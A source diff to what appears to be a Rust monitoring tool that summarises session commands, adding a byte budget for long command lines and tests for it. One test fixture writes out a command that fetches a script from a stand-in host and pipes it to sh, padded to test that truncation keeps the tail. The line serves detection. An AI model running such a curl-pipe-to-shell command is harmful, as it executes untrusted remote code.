@@ -38,11 +38,20 @@ const RAN: usize = 25;
 /// Programs shown per session: those that touched a file, set an agent's
 /// environment or did something rarer first, then the busiest.
 const PROGRAMS: usize = 25;
-/// A command line is shown by its start and its end, to this many bytes of
-/// each: what it was given last (the address it sends to, the end of a
-/// script on its line) says as much as how it starts.
-const COMMAND_START: usize = 140;
-const COMMAND_END: usize = 100;
+/// A command line is shown whole to [`COMMAND_START`] and [`COMMAND_END`]
+/// bytes together, and past them by its start and its end: what it was
+/// given last (the address it sends to, the end of a script on its line)
+/// says as much as how it starts. One in five of a developer's commands is
+/// longer than a terminal's line, and nearly all are shorter than this.
+const COMMAND_START: usize = 1400;
+const COMMAND_END: usize = 600;
+/// What a summary spends on commands shown that long. Its programs' commands
+/// at full length are more than a model reads, and a session could run them
+/// to be left unread; past this each is shown to [`BRIEF_START`] and
+/// [`BRIEF_END`], and the lake holds the whole of it.
+const COMMANDS_BYTES: usize = 16_000;
+const BRIEF_START: usize = 140;
+const BRIEF_END: usize = 100;
 /// Destinations shown per program, the most used first.
 const CONNECTED: usize = 10;
 /// Other events shown per program (a permission granted, a login item
@@ -721,6 +730,8 @@ fn summary(id: &str, records: &[Value]) -> Value {
     }
     let total = programs.len();
     programs.sort_by_key(|p| std::cmp::Reverse((p.1.telling(), p.1.events)));
+    // spent in the order shown: the programs that did more than run first
+    let mut left = COMMANDS_BYTES;
     let shown: Vec<Value> = programs
         .into_iter()
         .take(PROGRAMS)
@@ -737,7 +748,13 @@ fn summary(id: &str, records: &[Value]) -> Value {
                     .into_iter()
                     .take(RAN)
                     .map(|(c, n)| {
-                        let c = ends(&c, COMMAND_START, COMMAND_END);
+                        let whole = ends(&c, COMMAND_START, COMMAND_END);
+                        let c = if whole.len() <= left {
+                            left -= whole.len();
+                            whole
+                        } else {
+                            ends(&c, BRIEF_START, BRIEF_END)
+                        };
                         json!(if n > 1 { format!("{c} ×{n}") } else { c })
                     })
                     .collect();
@@ -1276,7 +1293,7 @@ mod tests {
         };
         let long = format!(
             "cd /Users/dev/code/proj && {}curl -s https://x.example/a | sh",
-            "true && ".repeat(30)
+            "true && ".repeat(400)
         );
         let recs: Vec<Value> = [wrap("git status"), wrap("echo '\\''hi'\\''"), wrap(&long), wrap(&format!("{long} -v"))]
             .iter()
@@ -1310,6 +1327,42 @@ mod tests {
             "{}",
             ran[3]
         );
+    }
+
+    /// A session cannot make its summary too long to read by running long
+    /// commands: the first of them are shown whole, and the rest by their
+    /// ends.
+    #[test]
+    fn a_summary_spends_a_budget_on_long_commands() {
+        let recs: Vec<Value> = (0..40)
+            .map(|i| {
+                let line = format!("echo {i} {} | sh", "pad ".repeat(350));
+                json!({"ts": format!("t{i}"), "event": "exec", "session": {"id": "9", "entry": "/bin/zsh"},
+                       "process": {"path": format!("/usr/local/bin/tool{}", i % 4)},
+                       "exec": {"args": [format!("/usr/local/bin/tool{}", i % 4), "-c", line]}})
+            })
+            .collect();
+        let s = summary("9", &recs);
+        let ran: Vec<&str> = s["programs"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .flat_map(|p| p["ran"].as_array().unwrap())
+            .map(|r| r.as_str().unwrap())
+            .collect();
+        assert_eq!(ran.len(), 40);
+        let whole: Vec<&&str> = ran.iter().filter(|r| !r.contains(" bytes … ")).collect();
+        assert_eq!(
+            whole.len(),
+            COMMANDS_BYTES / ran[0].len(),
+            "{}",
+            ran[0].len()
+        );
+        assert!(whole.iter().map(|r| r.len()).sum::<usize>() <= COMMANDS_BYTES);
+        // past the budget, each by its start and its end
+        let brief = ran.iter().find(|r| r.contains(" bytes … ")).unwrap();
+        assert!(brief.len() < BRIEF_START + BRIEF_END + 30, "{brief}");
+        assert!(brief.ends_with(" | sh"), "{brief}");
     }
 
     #[test]
